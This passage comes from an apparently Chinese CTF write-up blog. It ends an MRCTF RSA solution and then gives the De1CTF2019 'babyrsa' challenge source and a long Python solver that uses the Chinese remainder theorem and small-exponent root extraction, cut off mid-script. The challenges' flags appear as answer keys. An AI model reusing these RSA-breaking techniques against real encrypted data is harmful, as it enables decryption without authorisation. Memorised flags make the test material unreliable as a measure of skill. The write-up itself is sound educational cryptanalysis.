number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> factor2    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>factor2<span class="token punctuation">)</span>p <span class="token operator">=</span> solve_p<span class="token punctuation">(</span>P_n<span class="token punctuation">,</span> P_F_n<span class="token punctuation">)</span>K <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Q_E_D <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> Q_n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>phiq <span class="token operator">=</span> <span class="token punctuation">(</span>Q_E_D <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> Kq <span class="token operator">=</span> solve_q<span class="token punctuation">(</span>Q_n<span class="token punctuation">,</span> phiq<span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>Ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'MRCTF&#123;Ju3t_@_31mp13_que3t10n&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="De1CTF2019-babyrsa"><a href="#De1CTF2019-babyrsa" class="headerlink" title="[De1CTF2019]babyrsa"></a>[De1CTF2019]babyrsa</h4><p><strong>TAG: 复杂rsa的典范、中国剩余定理求解、小指数攻击</strong></p><p>这里</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">from</span> data <span class="token keyword">import</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q1p<span class="token punctuation">,</span> q1q<span class="token punctuation">,</span> hint<span class="token punctuation">,</span> flagn <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span><span class="token punctuation">,</span>    <span class="token number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span><span class="token punctuation">,</span>    <span class="token number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span><span class="token punctuation">,</span>    <span class="token number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span><span class="token punctuation">,</span>    <span class="token number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span><span class="token punctuation">,</span>    <span class="token number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span><span class="token punctuation">,</span>    <span class="token number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span><span class="token punctuation">]</span>f <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> c<span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>ee1 <span class="token operator">=</span> <span class="token number">42</span>ee2 <span class="token operator">=</span> <span class="token number">3</span>ce1 <span class="token operator">=</span> <span class="token number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span>ce2 <span class="token operator">=</span> <span class="token number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span>tmp <span class="token operator">=</span> <span class="token number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span>n <span class="token operator">=</span> <span class="token number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span><span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>e1<span class="token punctuation">,</span> ee1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> ce1<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>e2 <span class="token operator">+</span> tmp<span class="token punctuation">,</span> ee2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> ce2<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">46531</span>n <span class="token operator">=</span> <span class="token number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span>c <span class="token operator">=</span> <span class="token number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span>hint <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>q1p <span class="token operator">*</span> q1q <span class="token operator">==</span> n<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>q1p <span class="token operator">&lt;</span> q1q<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>hint<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>q1 <span class="token operator">=</span> q1pq2 <span class="token operator">=</span> <span class="token number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span>c1 <span class="token operator">=</span> <span class="token number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span>c2 <span class="token operator">=</span> <span class="token number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> p <span class="token operator">*</span> q1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> p <span class="token operator">*</span> q2<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后求flag的这一步有些复杂。首先是看题目给出的两个式子就知道不是可以直接求得flag的，事实也正是如此。因为这里求得的<code>e1和phi1</code>、<code>e1和phi2</code>是有相同的最大公约数<strong>14</strong>的。可以先求出<code>m^14</code>这个值，然后再根据<code>q1、q2</code>跟<code>m^14</code>这个值的关系利用中国剩余定理求得关于<code>m^2</code>的另一个rsa的算式，可以直接求出m也就是flag。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span><span class="token punctuation">,</span>    <span class="token number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span><span class="token punctuation">,</span>    <span class="token number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span><span class="token punctuation">,</span>    <span class="token number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span><span class="token punctuation">,</span>    <span class="token number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span><span class="token punctuation">,</span>    <span class="token number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span><span class="token punctuation">,</span>    <span class="token number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>    c <span class="token operator">=</span> a2 <span class="token operator">-</span> a1    <span class="token keyword">if</span> c <span class="token operator">%</span> d <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">%</span> n2 <span class="token operator">+</span> n2<span class="token punctuation">)</span> <span class="token operator">%</span> n2    c <span class="token operator">=</span> c <span class="token operator">//</span> d    n1 <span class="token operator">=</span> n1 <span class="token operator">//</span> d    n2 <span class="token operator">=</span> n2 <span class="token operator">//</span> d    c <span class="token operator">*=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>    c <span class="token operator">%=</span> n2    c <span class="token operator">*=</span> n1 <span class="token operator">*</span> d    c <span class="token operator">+=</span> a1    <span class="token keyword">global</span> n3    <span class="token keyword">global</span> a3    n3 <span class="token operator">=</span> n1 <span class="token operator">*</span> n2 <span class="token operator">*</span> d    a3 <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">%</span> n3 <span class="token operator">+</span> n3<span class="token punctuation">)</span> <span class="token operator">%</span> n3    <span class="token keyword">return</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">exCRT</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    a1 <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    n1 <span class="token operator">=</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    le <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> le<span class="token punctuation">)</span><span class="token punctuation">:</span>        a2 <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        n2 <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> merge<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        a1 <span class="token operator">=</span> a3        n1 <span class="token operator">=</span> n3    <span class="token keyword">global</span> mod    mod <span class="token operator">=</span> n1    <span class="token keyword">return</span> <span class="token punctuation">(</span>a1 <span class="token operator">%</span> n1 <span class="token operator">+</span> n1<span class="token punctuation">)</span> <span class="token operator">%</span> n1p <span class="token operator">=</span> exCRT<span class="token punctuation">(</span>c<span class="token punctuation">,</span> n<span class="token punctuation">)</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>ee1 <span class="token operator">=</span> <span class="token number">42</span>ee2 <span class="token operator">=</span> <span class="token number">3</span>ce1 <span class="token operator">=</span> <span class="token number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span>ce2 <span class="token operator">=</span> <span class="token number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span>tmp <span class="token operator">=</span> <span class="token number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span>n <span class="token operator">=</span> <span class="token number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span><span class="token keyword">def</span> <span class="token function">rune</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> c <span class="token operator">+</span> k <span class="token operator">*</span> n        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        k <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span>e1 <span class="token operator">=</span> rune<span class="token punctuation">(</span>ee1<span class="token punctuation">,</span> n<span class="token punctuation">,</span> ce1<span class="token punctuation">)</span>e2 <span class="token operator">=</span> rune<span class="token punctuation">(</span>ee2<span class="token punctuation">,</span> n<span class="token punctuation">,</span> ce2<span class="token punctuation">)</span> <span class="token operator">-</span> tmp<span class="token keyword">print</span><span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">46531</span>n <span class="token operator">=</span> <span class="token number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span>c <span class="token operator">=</span> <span class="token number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span><span class="token comment"># 上面的这个n是可以在线分解的，但是线下的时候不能用在线的环境哎</span>q1q <span class="token operator">=</span> <span class="token number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span>q1p <span class="token operator">=</span> n <span class="token operator">//</span> q1q<span class="token keyword">if</span> q1p <span class="token operator">></span> q1q<span class="token punctuation">:</span>    q1p<span class="token punctuation">,</span> q1q <span class="token operator">=</span> q1q<span class="token punctuation">,</span> q1pd <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>q1p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>hint <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!'</span>q1 <span class="token operator">=</span> q1pq2 <span class="token operator">=</span> <span class="token number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span>c1 <span class="token operator">=</span> <span class="token number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span>c2 <span class="token operator">=</span> <span class="token number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span><span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>e1 <span class="token operator">=</span> e1 <span class="token operator">//</span> <span class="token number">14</span>e2 <span class="token operator">=</span> e2 <span class="token operator">//</span> <span class="token number">14</span>d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span 